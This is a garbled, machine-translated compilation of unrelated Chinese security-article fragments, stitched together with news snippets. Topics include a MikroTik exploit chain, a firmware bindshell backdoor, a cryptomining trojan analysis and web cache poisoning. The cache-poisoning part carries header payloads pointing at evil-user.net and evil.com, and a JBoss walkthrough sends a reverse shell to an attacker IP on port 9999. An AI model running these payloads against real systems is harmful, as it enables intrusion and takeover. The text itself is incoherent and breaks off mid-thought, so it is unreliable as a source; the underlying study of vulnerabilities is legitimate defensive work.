0x01. Preface MikroTik router was found in April with a directory traversal vulnerability CVE-2018-14847, the risk degree is medium
Hacking tools combined with the vulnerability have been released, and MikroTik devices running RouterOS are the target of malicious code
This paper starts with the communication protocol between MikroTik RouterOS and the client, supplemented by reverse analysis, deeply interprets the vulnerability principle of CVE-2018-14847 and the built-in developer backdoor, and finally makes a complete combination of advanced utilization to achieve the purpose of Get bash shell
The overall flow chart is as follows: 0x02. Communication Protocol Analysis MikroTik RouterOS is a system based on Linux core development, compatible with Arm, mips, x86 PC and other architecture network equipment operating system
And Winbox for MikroTikRouterOS is a GUI client application for managing the MikroTik RouterOS system
RouterOS Official provides the corresponding ISO system mirror package, so you can install RouterOS like a normal operating system, and install a virtual machine directly in vm
Configure the RouterOS through CliTelnet, but know the following two points: This is not an osbash shell. The operating system that cannot access the underlying linux can only configure and manage the RouterOS with some of the built-in commands. From the nmap scan results below, you can see that RouterOS specifically provides the 8291 port to communicate with winbox
This is a very old PPP protocol (there is an offline collision cracking vulnerability). From the js code and packets, the identity authentication method is: question / answer (Challenge / Response)
0x04. The overall utilization of the vulnerability is very clear: 1
67: "Router firmware backdoor add 0X01 preface" the last article describes how to use Firmadyne for firmware simulation, Firmadyne is based on QEMU virtual machine, the entire firmware package system architecture simulation and run firmware, this article mainly describes the process of firmware package after tampering
0X02 extraction firmware system FMK introduction: firmware tampering process will use FMK tool-firmware-mod-kit, the tool can use binwalk tools to extract file system from the firmware, the proposed file system content tamper with, and then repackaged into a new firmware package, the tampered firmware package refresh device, the installation command is as follows, the tool attifyOS system has been deployed, no longer detailed
Looking at the folder content, you can see that the rootfs directory contains a complete file system, which is the main location to add a backdoor
0X03 ARM, MIPS, X86 architecture introduction to add backdoor programs need to see the firmware based on architecture, such as the mainstream ARM and MIPS architecture: ARMARM is advanced lean instruction set (Advanced RISC Machine), it is a 32-bit streamline instruction set architecture, but also equipped with 16 bit instruction set, generally than equivalent 32 bit code save 35%, but can keep all the advantages of 32-bit system
The generated cross-compilation tool can be found in the buildroot / output / host / usr / bin directory, and the compiler of mips is the mipsel-linux-gcc under that directory
Implement the mipsel-linux-gcc- -version view version to compile the above backdoor file bindshell.c into a binary file capable of embedding the file system
65: ADLab, background AD Lab recently found a large number of well-known software installation program was implanted in the mining virus, the hackers behind the virus tried to release infected software installation packages through social channels such as software sharing forum, we call the malicious software "install ghost" mining virus
Attackers in multiple BBS "sharing" bundled with "ghost" mining virus crack versions of various popular applications, including "Malwarebytes", "CCleaner Professional" and "Windows 10 Manager" and other well-known applications a total of 26 kinds, together with different versions of 99, features covers system optimization, software uninstall, CD burning, antivirus, system activation, resource download, etc
These apps come from well-known companies such as Google, Piriform and Malwarebytes, especially "CCleaner Professional" and "Speccy Professional Business Technician" that have been used by millions of home and business users and have been installed in several countries around the world
2. Infection process "install ghost" mining virus infection process as shown in figure 1, the attacker will first contain "install ghost" crack installation package uploaded to "mega", "clicknupload", "fileupload" and other cloud disk, and then the file download link through "NITROWAR", "MEWAREZ" forum "share" transmission, the corresponding software by the victim download installed run, "install ghost" will start execution
First, Install Ghost copies the system file "% Windows%\\Microsoft.NET\\Framework\\v3.5\\vbc.exe" to the% temp% directory of the system, named svhost.exe and starts it, and then injects the malicious code into the svhost.exe process space
The malicious code injected into the svhost.exe process space on the one hand creates the mining profile, on the other hand, injects the mining virus into the "% Windows%\\System32\\wuapp.exe" puppet process, and finally takes the configuration file as the parameter for the mining operation, which is very hidden
Our researchers originally captured a crack installation package of the "Internet Download Manager" download manager (IDM later). After installing the IDM, we found that the computer had an abnormal connection to port 4444 of a remote server
After further analysis, we finally found the "installation ghost" mining virus bundled inside the IDM crack installation package
The "Installation ghost" is bundled into the cracked IDM downloader installer. In the process of installing the IDM, it is released to the users computer for mining operations, to earn profits for the attacker
In addition to the implanted version of the IDM, other "activated versions" of "Malwarebytes", "Advanced SystemCare Pro", "Windows 10 Manager", "CCleaner Professional" and "CyberGhost" were released
Figure 5 The installer releases svchost file malicious code on the one hand, create the "KeAgPGdPeF" folder in the "%Users% \ \ ThinkPad \ \ AppData \ \ Local" directory, and create a new profile cfgi and cig in the "KeAgPGdPeF" directory, and then write the configuration information required for the "install ghost" mining virus to the profile as shown in Figure 6
Figure 6 Malicious code writes configuration information to the configuration file. See Figure 7, The profile contents are the parameters required to use for the Install Ghost mining virus run saved in json format, As we can see, in Figure 7, Mine address is " pool.minexmr.com: 4444 ¡å, The wallet address is "41yPyJBBpN3BAMP5C4bYJe7MRdoWLXsiJWPrsZ2ZcERWecu1hAnFjqUgXzVvs8wJqKioKrNEWqdT2B6GBY2yA9tU9mZ5u4e", In addition to the data such as the address of the mine pool and the Monroe wallet address, the profile also contains other configuration data such as retry number, retry interval, number of threads, and CPU priority
Figure 7 The malicious code on the other hand runs the mining puppet process "% Windows%\\System32\\wuapp.exe", incoming the cfg mining profile through-c "%Users% \ \ ThinkPad \ \ AppData \ \ Local \ \ KeAgPGdPeF \ \ cfg" as a parameter (see Figure 8), aiming to use the mining program XMRig 2.5.0 injected into the puppet process memory space, as shown in Figure 9
Figure 8 incoming mining configuration file, running the mining puppet process Figure 9 injected into the puppet process mining program 5, mining account "install ghost" mining virus corresponding to the wallet address query results see figure 10, from figure 10 we can see that the account in the last 90 days, the calculation power are: (24h) 342.97 H / s, (12h) 340.20 H / s, (1h) 482.60 H / s, (10m) 429.00 H / s, and until now, the mining behavior is still active
According to BleepingComputer statistics, dozens of malicious viruses have spread to the Monroe coin mining machines, and in 2018, the situation is even worse
According to Javier Villalba, the anti-virus software pioneer hanged himself in despair after nine months in prison
I first heard that Web Cache Poisoning was in the HTTP bag, but I didnt care much at that time, but now I will officially face it
Web Cache Different from the OWASP TOP10 series of sharp loopholes, it is generally as an auxiliary means, the status is higher than CORS, lower than CSRF
Web Cache Poison in many well-known websites, such as Google, Baidu, msn, Bing, etc... give people a taste of everywhere 0x02 concept clear learning loopholes: know the concept, know the attack, understand the defense
The principle is shown in Fig. 2. How to conduct Poison on the basis of the Web Cache operation process? How to perform the Poison based on the Web Cache running process? If the attacker first triggers the server cache with a malicious Payload response, he will receive the malicious response when other users send the same request
From the perspective of the scope of influence, once the successful cache is poisoned in response, it will affect a large number of users, which is much more harmful than some previous attacks against a certain user
Therefore, Web Cache Poisoning is an auxiliary means of attack, a bit of the flavor of the results
The server side only recognizes whether the features set to the cache key are the same, which leads to the Web cache poisoning vulnerability
0x03 The Exploit of Web Cache poisoning is divided into two parts, which we will talk about in detail later
Web Cache The harm of four words: expand the results 1. Web Cache Poisoning ideas of this set of ideas based on the premise of other loopholes, the idea of Web Cache Poisoning
1. Find out not Web Cache cache input took out this schematic diagram we want to construct Web Cache poisoning need our input to feedback in the response, but if our input is set to cache key, it is impossible to have user equivalent request ¡ª¡ª¡ª¡ª because the place the user request will be stopped, a look at the schematic diagram will immediately understand ~ so we need to constantly debugging until find our input is not cache key and can be feedback in the cached response
This ensures that the poisoned response cache is put to the victim, and Port recommends a plugin called Param Miner to help us find such fields that will not be cached
2. After we confirm the input that is not cached from the backend server, we need to see how the server handles the input. If it can dynamically feedback to the response, it is the key to launch the Web cache poisoning
3. It is not enough for our input to be fed back into the response, but also to generate the cache, so that we can really land the malicious Payload
So we still have to keep debugging to successfully find the operation to generate the poisoning cache
The overall vulnerability utilization is divided into two parts one is Web Cache Poisoning attack based on cache design defect the other is Web Cache Poisoning attack based on cache implementation defect 0x04 based on cache design defect Web Cache Poisoning attack 1. Use Web Cache Poisoning to expand XSS results because XSS attack is also part of the input is feedback in the response, So Web Cache, poisoning can be combined with XSS
GET / HTTP / 1.1 Host: innocent-website.com X-Forwarded-Host: evil-user.net / / write malicious EXPUser-Agent: Mozilla / 5.0 Firefox / 57.0 HTTP / 1.1 200 OK <script src= \ " X-Forwarded-Host head for Web Cache Poisoning case
Then find any of the products in the shooting range, grab the package, take the domain name of Exploit Server as the parameter of X-Forwarded-Host, and then recontract in Repeater several times to let the Web cache generation
Modify the package, GET / random HTTP / 1.1 Host: innocent-site.com X-Forwarded-Proto: evil.comHTTP/1.1 301 moved permanently Location: Web cache poisoning with multiple headers Lets follow the previous title, Attack by using the X-Forwarded-Host, Found that the previous js path is failed, We were not able to attack
According to the idea of multi-HTTP Header attack, we add the X-Forwarded-Scheme header and assign it \ "HTTP \" X-Forwarded-Scheme: HTTPX-Forwarded-Host: www.baidu.com appears Location, which is a redirection
4. Through Cache-Control, here mainly introduces the Vary header and Cache-Control. We add Via and Cache-Control to the HTTP Request package to get the leaked information
We pasted the victims UA in and made the attack
HTTP / 1.1 200 OK Content-Type: application / json Access-Control-Allow-Origin: * {\ "malicious json \": \ "malicious json \"} This attack mode requires relatively high code audit, you can take a look patiently
Lab: Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria Scan using the Param Miner, Using Param Miner scanning is slower, Dont worry ~; Finally found the presence of Web Cache Poisoning in the interface /, And can forge the field of X-Forwarded-Host. Try the X-Forwarded-Host header in Repeater, contract award
That is, the initGeoLocate (/ / + data.host + / resources/json/geolocate.json, incoming JSON data is vulnerable to DOM XSS
Payload Add a JSON object with a value of the Payload for the DOM type XSS
But this is a translation page, and we need to add an X-Original-URL field to the home page pointing to the translation page, so that the people who access the home page will be redirected to this page
Based on Cache Key, the basic steps of defective Web Cache poisoning are based on Cache Key. defective Web Cache poisoning is generally three steps. 1. Identification whether the response received is from the cache or the server, this step is called identifying Cache oracle
Tool preparation reverse common tools: PEID, DIE, windbg, x32dbg, x64dbg, winhex, IDA, OD debugging 32 bit program: xp virtual machine, debugging 64 bit program: win7 virtual machine CTF in reverse solution ideas first step: shell check the two tools I commonly used are PEID and DIE
Shell first need to pay attention to the language, such as VB, VC + +, Go, easy language... each language has its specific characteristics and API function call, focus on API functions, such as GetWindowTextA (W), MessageBoxA (W), and so on, shell mainly do know
In fact, in CTF, it is also a racing race, see the upx, directly take off the upx-d in the command line, if it is asp, the automatic shell machine may fail, you can directly use the ESP law to manually shell, dump out, put into the IDA static analysis
In IDA has a skill, will appear on the left list of the function of the program, you are more in see, not necessarily means to open the IDA to main function, just click on the function list of other functions, not necessarily only focus on main function, F5 to see, a lot of time there will be surprises, struggling to find the core algorithm in reverse, in the pwn, backdoor function, maybe just look at can be another village
As shown in one is a CTF in question, through the diagram can quickly locate to the key jump, even omit the analysis disassembly steps, ocx register in reverse a very common role is as buffer user input, as parameters incoming strlen function, return value in easy, the next program with easy (the length of the user input string) compared with 0x14, determine the program
In the sample analysis, you can even obtain the IP address of the C & C server directly through the string search
Encounter some static analysis is not intuitive function, this is necessary to put OD debugging
If you are not familiar with the magic change process, you can put OD static debugging, you can see the whole string processing process
Application security testing There are three common application security tests: SAST (static code audit), DAST (black box security audit) and IAST (interactive application security test)
It helps developers fix runtime traffic by using Agent deployed on the Web application to identify security vulnerabilities in real time. IAST provides higher test accuracy and details the exact location of the vulnerability in the application code in real time
General vulnerability scanning hole state currently by Agent + Server way, support Java, Python, GoLang, Php language development application of interactive vulnerability scanning, general principle is through Hook technology combined with stain spread, the program all method parameters, data flow analysis to identify vulnerabilities, this way of vulnerability detection is no false positive, thus can save the cost of operation
For a simple example (python3 + Flask):@app.route (\ "/ test \", methods= [\ "POST \"]) def Test(): data = json.loads(request.get_data()) argv1 = data [\ "argv 1 \"] exec (argv 1) It is obvious that the above code is an interface with a code execution vulnerability, The principle of hole state detection is by monitoring all the methods under request in Flask and exec, eval and other methods that can execute commands, By stain propagation can be detected when the parameters are incoming from the request request, The inflow command execution function is a code execution vulnerability
Component vulnerability identification is also one of the highlights of the hole state. It can well monitor the security of the project components, and the modified module itself has the ability of component vulnerability detection. At the same time, some 1day component vulnerabilities can be identified and alerted in combination with intelligence
In early July, I saw a blog, ¡ª¡ªMODeflattener Miasms OLLVM Deflattener, where the author also published his source code on Github, so I decided to find out
JBoss 5.x/6.x Reciialization vulnerability (CVE-2017-12149) Range: JBoss 5.x/6.x1) Verify whether there is a vulnerability Access / invoker / readonly: Return to 500, indicating that the vulnerability exists in this page
JBoss JMXInvokerServlet deserialization vulnerability (CVE-2015-7501): Since the invoker / JMXInvokerServlet path in JBoss, the jmx component of JBoss supports Java deserialization
2) Vulnerability exploit The ser generated by CVE-2017-210-12149 is sent to the / invoker / JMXInvokerServlet interface
3) Repair suggestion (1) Delete JMS deserialization (CVE-2017-7504) vulnerability introduction: In JBoss AS 4.x and previous versions, the HTTPServerILServlet.java file of JMS over HTTP Invocation Layer has deserialization vulnerability
JBoss EJBInvokerServle Serialization vulnerability (CVE-2013-4810) access / invoker / EJBInvokerServlet, can return the results can be used
The ame principle as CVE-2015-7501 vulnerability
The difference is that the JMXInvokerServlet and the EJBInvokerServlet use the org.jboss.invocation. MarshalledValue Recialization, while web-console / Invoker utilizes org.jboss.console. remote.RemoteMBeanInvocation The file that deseriifies the upload construct
While Telnet passwords are set on some devices, most devices can allow anyone to connect to a router and change their configuration
Anubhav said, " This is not a device architecture issue, but a configuration issue of the devices telnet being exposed
For attackers, taking over these routers is a piece of cake, because they can write automatic scripts to exploit the lack of Telnet passwords to incorporate exposed routers into the botnet
69: " What is an APT attack? What is the ATT & CK? Todays knowledge box takes you to learn about the top red team
The full name of ATT & CK is Adversarial Tactics, Techniques, and Common Knowledge (ATT & CK)
Its a model from the perspective of an attacker to describe the technology used at the stages of an attack, proposed by MITRE, which has been doing threat modeling for the U. S. military
In ATT & CKs technology matrix, there are specific scenarios for each technology showing how an attacker uses the technology through a malware or action solution, citing many articles published by blogs and security research teams
The attacker will use different techniques to implement the initial access techniques
(2) The execution of "execution" tactics is a necessary tactic for all attackers, because no attacker will choose "execution" tactics in order to successfully attack malware, ransomware or APT attacks to enter the host
This is unavoidable, but from another point of view, if the malware must run, the security defense personnel will have the opportunity to stop or detect him, whether it is active or standby, are likely to successfully prevent
(3) persistent "persistent" tactics is one of the most popular technology, in addition to ransomware, most of the attacker survival time depends on when you are detection system found, imagine, an attacker spent a lot of attack cost into a host, he must not willing to spend the same time cost waste in the process of the next time, so the most simple way to reduce workload is "back door" or called "persistent"
And there are some technologies that can allow some malware to fool antivirus products from checking them at all, or to bypass whitelist technology
For example, modifying registry key values, deleting core files, disabling security tools, and more
Of course, as defenders, we can respond to such tactics by monitoring changes on the terminal and collecting logs of key systems that will leave the intrusion invisible
Imagine, if an attacker can openly log in, then why spend a lot of attack costs to risk using the 0day vulnerability intrusion
(8) Horizontal movement "Horizontal movement" tactic is one of the common tactics of attackers. After an attacker uses a vulnerability to enter the system, he usually tries to move horizontally in the network, whether to collect information or continue to find a breakthrough point for the next attack
Even ransomware, or even ransomware for only a single system, often tries to move around the network to find its targets
Attackers usually look for a foothold, and then start moving around the system, looking for better access, and eventually control the overall network
(9) Collecting "collecting" tactics is a technique used by an attacker to discover and collect the data needed to achieve the goal
(10) Commands and Control Most malware now has a certain degree of command and control
Hackers can infiltrate data and tell the malware what instructions to do next
For each command and control, the attacker accessed the network from a remote location
(11) Data leakage After an attacker gets access, he will search around for relevant data and then start to infiltrate the data
But not all malware can reach this stage
For example, ransomware usually has no interest in data
(12) Influence "impact" is the last tactic of ATT & CK, where the attacker tries to manipulate, interrupt, or disrupt the enterprises systems and data
But I later found out that BloodHound is also a very powerful tool for an attacker
Next, well tell you how to take advantage of BloodHounds untapped new features to more effectively enable the active catalog, which is highly resilient and resilient to the vast majority of attacks
Attackers can often take advantage of this complexity and use target accounts to carry out attacks
And many companies also find themselves trapped in a seemingly inevitable cycle of security remediation, many organizations after the attack, will ask the same question: how do they achieve the attack? Next, organizations may conduct a detailed, thorough and lengthy investigation and obtain an attack investigation report in which researchers describe how attackers invaded their system step by step
Here is a sample report: " A user with a phishing attack that has local administrator rights to the enterprise network system
The attacker stole the built-in local administrator password, which is used by every system in the network
The attacker found a system from the network system that had already logged into an Domain Admin account, and then used the Mimikatz to steal the Domain Admins credentials from the system
Credential Guard Is an effective measure to mitigate voucher theft, but at least run Windows 10, and most organizational computers still run Windows 7
In fact, even if you could deploy the above strategy recommendations perfectly, when you accidentally suffer an attack, the attack study report could do this: " A users password is successfully guessed by the attacker
The attacker is connected to the enterprise VPN, where no multi-factor authentication is deployed
The attacker logged in to the system with a high permission service account, and the attacker injected malicious code into the process run by the service account. This service account has the add member permission and can add users to the Domain Admin group
As a result, the enterprise seems to be in an infinite cycle, because they have to respond to the attacker attack: the function of BloodHound and limit in general, the red team report will introduce the user attacker attack path, and the attack path often include lateral penetration and implementation through activity directory
And BloodHound attack path is very rich, including voucher theft, local administrator rights, security object control and so on
From an attackers point of view, they can use KSperling users to log into Desktop21 and then use Mimikatz to steal anti-virus user passwords
The diagram of the shortest attack path for the Domain Admin group is as follows: Here we only give the shortest attack path to the Domain Admin, Of course, Attackers can also use this way to disable or delete user accounts, Or use the following statement to delete the node on the Neo4j console: MATCH (u: User {name: USER99@CONTOSO.LOCAL})) DETACH DELETE u Flexible coping method Any good method needs to have a clear goal, Our elastic approach is very simple: find all the attack paths that an attacker is most likely to use, And execute these attack paths before the attacker
The function of the attack path elasticity technology is to reduce the attack surface of the active directory (AD), and BloodHound allows us to analyze the attack path of any node
To facilitate the presentation, we choose the most common goal that any organization wants to achieve: reducing the attack path of Domain Admin user accounts
We can directly on the way to simulate the modified situation, the following figure shows is the original attack path in the enterprise network: the modified situation as follows, the green part is removed attack path: in BloodHound sample database, we can analyze the data, and generate DA new shortest attack path diagram: the following display is the domain controller with local administrator permission security group: so now, we will add a in just assume: remove unnecessary local administrator permission from the domain controller! As you can see, the area of the green part has increased, which means that we have eliminated thousands of attack paths
51: "article directory 1, Darkhotel organization introduction 2, bait delivery 2.1 description 2.2 pollution of software upgrade / installation package 2.2.1 netease mailbox" master " 2.3 file camouflage 2.3.1 EXE disguised as picture 2.3.2 Lnk disguised as document 2.3.3 Lnk directly click 2.3.4 decompression file disguised as document 3, bait delivery article summary attached: about shadow lab reading: 311, Darkhotel organization introduction Darkhotel is an active for nearly 10 years of APT organization, Disclosed by Kaspersky in 2014, The earliest dates back to 2010
The group is named for targeting business executives and national dignitaries in upscale hotels, targeting China, North Korea, Japan, Myanmar, India and a handful of European countries
The group has several aliases such as parasitic beast, Dubnium, Nemim, Tapaoux, APT-C-06 and T-APT-02 and is considered to have a national background on the Korean Peninsula
Darkhotel The attack feature of the organization is to invade the network system of some high-end hotels, control the hotel WIFI, use social engineering means to send forged prompts to the WIFI target, induce them to download the specified tools and upgrade, and implant malicious backdoor to the target host
Because the attacker controls WIFI and knows the name, time and room number, the target is in a semi-monitored environment without knowing it
In recent years, the group has repeatedly launched puddle attacks by a normal packages
In addition, the Darkhotel also uses phishing attacks
Attackers send emails to corporate executives and state dignitaries on a carefully designed topic, closely related to industry policy trends or political hot-spot issues, including malicious documents constructed
Most of these files are shortcuts, self-release files, or documents carrying a 0day vulnerability that trigger malicious behavior when the target is opened and running
Darkhotel The Trojan tools used in various forms, including traditional remote control Trojan, spyware and upgrade downloads, as well as unique file infection components
The former is used to steal sensitive user information, while the latter is used to break the restrictions under the isolation network for a wider range of attacks
2. Bait delivery 2.1 technique Darkhotel Delivery bait is mainly divided into three types: document with vulnerability with backdoor tools / installation package camouflage document camouflage document vulnerability document is one of the attack load commonly used by APT organization
For example, in 2014, the organization took advantage of the Adobe 0day vulnerability CVE-2014-0497 to launch targeted attacks on a number of specific mailbox users in China
In 2015, the group took advantage of the 0day vulnerability CVE-2015-8651
The attacker sent phishing emails, including embedded malicious swf link Word documents, through the shellcode download to execute subsequent malicious programs
Since then, the group has been reported to continue to use other vulnerabilities, including CVE-2017-11882, CVE-2018-8174, and CVE-2018-8373
For the latter two types, malicious programs or files will be released during the attack process, and normal software or open normal files will be installed to cover up the malicious behavior, so it can deceive the target
Back in 2014, the group launched puddle attacks in several hotels, asking targets to upgrade tools such as Adobe Flash, Google Toolbar and Windows Messenger, but actually inserted back doors
The group has also released seeds for adult content on Japanese p2p networks, and provided compressed package decryption tools that will eventually release malicious programs
Darkhotel Has also induced the target to click to execute executable files or malicious shortcuts (Lnk) disguised as pictures or documents to launch subsequent activities
In 2019, it was reported that Darkhotel had launched an attack on senior executives of Chinese and foreign trade enterprises []
The attacker forged the netease cloud mailbox master installation package, and released the normal mailbox master will download and load malicious Dll, used to download and install subsequent malicious programs
Dll detects the process of loading itself, respectively winword.exe, powershell.exe and searchIndexer.exe
This can accommodate Dll injection, including Word vulnerability exploitation or document camouflage, powershell download execution components, and hijacking wsearch services
If the own process is winword.exe, use rundll32.exe to load itself and call the function name
If lame.dll exists, again detect a hard-coded desoft process: 360tray.exe, ZhuDingFangYu.exe, QHSafeTray.exe, QHActiveDefense.exeAvastUI.exe, avgui.exe If one of the above processes exists, download lame.dll again, copy it to the System32 directory, rename it msTracer.dll, and set the wsearch service to start itself
The wsearch service runs the searchIndexer.exe, which loads the msTracer.dll, and thus implements the hijacking
If there is no above kill, use rundll32.exe to load itself and call the ame 3 function, and start the lame.dll by modifying the registry and add the service LameSvc
Service name LameSvc Display name LAME MP3 Encoder Service executable path% SystemRoot%\\\\System32\\\\svchost.exe-k lamesvc If you load your own process is SearchIndexer.exe, create the SearchProtocolHost.exe process
The process will also load the msTracer.dll mentioned above to form a hijacking
If the load process is powershell.exe, get the native information, including computer name, user name, process list and other information, and then detect the existence of lame.dll in the specified directory, no download, exit the program
2.3.1 EXE disguised as images In an attack in 2015, Darkhotel disguised the executable file as an image to induce the target to click
Then PE creates a shortcut to a hidden mspaint2.lnk under the AppData \ \ Roaming \ \ Microsoft folder and opens
Here lnk as an intermediate component, contains malicious script, the function is to download the second stage of JS script
2.3.2 Lnk disguised as a document In a 2016 attack, Darkhotel disguised the malicious lnk as a doc document icon and downloaded the executable file through a fixed command line, which specified a download connection and saved the file as dwm.exe for execution
Dwm.exe Is a Dropper program with a certain camouflage, with the same name as the Windows Desktop Manager component, after running will release the disguised document to deceive the target, so that they do open the document
The final payload released by the lnk social worker file was a downloader called xxxx21.exe, the same program released by the 2015 document with the Adobe vulnerability swf
The downloader connects to the specified C & C, downloads the Final Stage Trojan and injects it into the windows process
C2 receives this request and returns the encrypted executable malicious load to the host machine
Eventually, the downloader decrypts the final malicious load to the local file and submits it to the explorer for execution
The organization is very good at disguising components while releasing malicious programs and normal files, making it often difficult for targets to detect the tricks behind them
Whether it invades the hotel network for malicious software delivery, or delivers it through phishing emails, Darkhotel has a strong ability to acquire and exploit potential network vulnerabilities
Research objectives include: botnet threats, DDOS confrontation, WEB confrontation, popular service system vulnerable utilization threats, identity authentication threats, digital asset threat, black industry threat and emerging threats
But almost all other states except Illinois can store, use and sell peoples facial information without their consent or knowledge
48: " 0x001 preface and then the last article, above the kernel_slide has leaked out, below continue to analyze the CVE-2016-1828 hole
On the home page, Wan Qian left the pot to the Zhihu account platform, but the official response said that the reason for the stolen account was that the account Wan Qian logged in was 163 email, and the Zhihu account was stolen only by the stolen email account. Zhihus own security is trustworthy
"This next fans boiling, netease email response instantly on the hot search, fans have said:" I see how I and fans wash the ground " so, what do you think Wan Qian should do next to save the situation? Microsoft recently warned a major campaign adviser for US Democratic presidential candidate Joe Biden that it was under attack by suspected Russian government-backed hackers, according to three people familiar with the matter
The hack targeted employees of SKDKnickerbocker, a Washington-based campaign strategy and communications company, and the company has worked with Biden and other prominent Democratic figures for the past two months, according to people familiar with the matter
A person familiar with SKDKs response to the hacking attack said the hackers had not yet had access to the companys network
Recently, the BBC has reported on the account of Liu Xiaoming, our ambassador to the UK
According to their reports, Ambassador Liu Xiaomings account was manipulated by anti-China attackers, praising pornographic videos on Twitter and rumors made by anti-China activists
Is it really so scary? On January 4, Toutiao officially responded to netizens doubts, saying that technically, the current processing of voice information is far from the level of obtaining personal privacy through microphones, and Toutiao will definitely not collect users privacy data without users knowledge
However, illegal access to user information case really many, before the New York times have reported, there are many Android game revealed will secretly call the phone microphone, to monitor the voice around the user, hundreds of Android and iOS games are using the smartphone microphone, record the habit of users watching TV, for advertising purposes
Can our chat really be accessed by the phone microphone and recognize the semantics? Voice print processing experts say that mobile APP can completely record the user voice, technically speaking, mobile APP is completely able to record the users daily voice
Is it possible that some APPs are taking the risk to illegally access users microphones? Apple responded that it did not rule out the possibility
However, for the APP of Toutiao, it should not take the risk of removing the APP to obtain users private information without authorization and do advertising promotion
Mobile security experts, common phones on the market, whether Android or Apple, will have a clear list of access to microphone APP, and these applications are not a few
In another case, there will be vulnerabilities at the system level in the mobile terminal environment. If the use leads to the implant of a Trojan horse or virus, eavesdropping is completely possible, but this is not applicable to most mobile phones
3. Double quotes "" when we search keywords, give keywords with a pair of double quotes, then the information displayed on the web page is you want to search for specific keyword information, such as we search "penetration test information collection", we will find on the page is about penetration test information collection related content
Use method: inurl: keyword / allinurl: keyword 1 keyword 2 inurl grammar can be said to be more common grammar in penetration test, we can use it to search some sensitive files, configuration files, such as we can through inurl: admin _ login can search some login management background page, not good luck can also pick up a weak password
intitle: Keywords can be understood as the keywords in the title, so through the grammar we can search for the title of the keyword containing the web page information, such as we conduct "penetration test information collection" search, you can get the keyword information contained in the title of the web page
53: Marriott International has announced that its Starwood hotel reservation system has been hacked, leaking the personal information of about 500 million customers, including their names, credit cards, email addresses, email and passport numbers
The motive for the breach of Marriotts hotel system is unclear, but security experts see the hotels Wi-Fi as a breakthrough
Starwood and Marriott were hacked in 2016, when tens of thousands of users credit card numbers were stolen
Of course, dont forget to check other accounts, maybe the hackers have followed them
Freezing credit cards not only makes it difficult for hackers to get your credit card reports, but also prevents them from creating new accounts with your information
After getting large amounts of data, hackers will try to access the data to the users other online accounts and services
As a reminder, dont mess around with the links in your email address, especially those phishing emails that "sell out" to protect or retrieve your personal information

Recently, MangaDex has been forced to temporarily shut down after source code was stolen from a cyber attack
While comic book lovers around the world are crying, MangaDex developers were publicly mocked by attackers
Last week, illegal attackers took advantage of the vulnerability to gain MangaDex site administrator, developer accounts, and access to the sites source code
After accessing and downloading the site source code, the attacker posted the source code of the MangaDex website on GitHub using the alias "holo-gfx"
Later, MangaDex began to urgently review the code and fix the vulnerability, and then the attacker fixed the vulnerability, watched the comment section to publicly mock the site developers, and directly tell the site developers fixing the vulnerability
At the same time, because the attacker had transferred the MangaDex database, MangaDex finally issued an announcement, announced the temporary closure, and told the registered users to change their password, and pay attention to the phishing attacks
41: " Hello everyone, cmdback again to join the fun, we continue to reproduce the vulhub vulnerability target machine, today mainly to reproduce the Samba remote code execution vulnerability (CVE-2017-7494), jboss, MySql (CVE-2012-2122), Openssl * * blood vulnerability
Samba Remote Code Enforcement Vulnerability This vulnerability: Samba allows you to connect a remote named pipe and calls the is _ know _ pipename() function to verify that the pipe name is legal before connection
Cause the attacker to construct a malicious dynamic link library file to execute arbitrary code
Lets first compile the vulnerability environment with docker: to reproduce this vulnerability, we need to use the MSF tool to test, First, lets find the use module exploit / linux / samba / is _ know _ pipename: set the target address and port information, One thing to note is that we need to know the absolute path to the writable directory, The writable directory in the test environment is / home / share: execute exploit for vulnerability attacks, Return a shell channel if successful, So we can successfully get access to the server: jboss into this jboss directory we found two CVE and one other type of vulnerability, Lets first repeat these two CVE, They belong to the jboss deserialization vulnerability: CVE-2017-12149: JBOSSApplication Server deserialization command execution vulnerability (CVE-2017-12149), A remote attacker uses a vulnerability to execute arbitrary code on a server host without any authentication
It does not restrict the classes that perform deserialization, allowing remote attackers to execute arbitrary code through carefully designed serialized data
We use the same way we said, By downloading the binary payload, Then send the payload to the target host, The attack machine listens to a certain port, Can return a shell channel: in order to distinguish between the previous, We listen port 9999 port: java-cp.: commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.106.128:9999, Then we listen to port 9999
JMXInvokerServlet-deserialization deserialization vulnerability cause: JBoss reads the objects incoming by users in the / invoker / JMXInvokerServlet request, and then we use the Gadget in Apache Commons Collections to execute arbitrary code
Vulnerability before we dont before the script, there is an integrated tool we have to use, this tool need java environment, we directly put the vulnerability url in verify whether can execute remote commands: MySql (CVE-2012-2122) authentication vulnerability exists the vulnerability version Mysql allows attackers to raise 256 user password, can successfully login Mysql server
First, compile the environment: we open the MSF tool exploit vulnerability module: use auxiliary / scanner / mysql / mysql _ authbypass _ hashdump set the IP address and port of the target host, Normal port is 3306: found by vulnerability verification, Even if the database password is wrong, it will be verified by the server: Openssl * * Blood bug OpenSSL * * bleeding vulnerability is that OpenSSL introduced the heartbeat (heartbeat) mechanism two years ago to maintain the long-term existence of TLS links, The heartbeat mechanism is implemented as an extended implementation of the TLS, However, neither TLS (TCP) nor DTLS (UDP) are tested in the code, So the attacker can exploit this vulnerability to obtain TLS links (can be a server, It can also be a client side) some data in the memory, At least 16 KB each time, In theory, the maximum amount is 64 KB
The vulnerability allows an attacker to read 64 KB of memory information from a server with the vulnerability
There are many vulnerability testing tools, such as MSF, nmap, python script, etc., to see their own needs
auxiliary / scanne r/s sl / openssl_heartbleed module in MSF: This module can only detect whether there is a * * blood vulnerability: use the script in nmap to detect: most of the replay can get the server permission, if there is something incorrect, please give more advice

33: " I dont know if you have such experience, weibo is always inexplicably followed a lot of people, there are such and such... once, we all thought it is the pot of Weibo, everyone said that the slag wave is really too much, money can do whatever you want? But after a case was solved yesterday, maybe Weibo for so many years can temporarily put down for a while this black production to play a big, let alone Weibo account forced to follow the account, maybe your Taobao account, WeChat account was also hijacked... hand BAT, carrying the headline number, all the combined suffered up to 96 enterprises! Most half of the domestic Internet can be said to be spared... originally, behind the whole gang has a boss, xing xing boss opened a software development company, just want to make a little money, never wanted to later made a big thing has established three companies, including a listed company ¡ª¡ª ray wins (founded in 2013,2017 listed on the new three board)
On the surface, Xing boss provides the operators with the development and maintenance of accurate advertising system, behind the purpose is to get the operators server remote login rights
After that, Xing boss sent people to develop a "malicious program", on the operators internal server
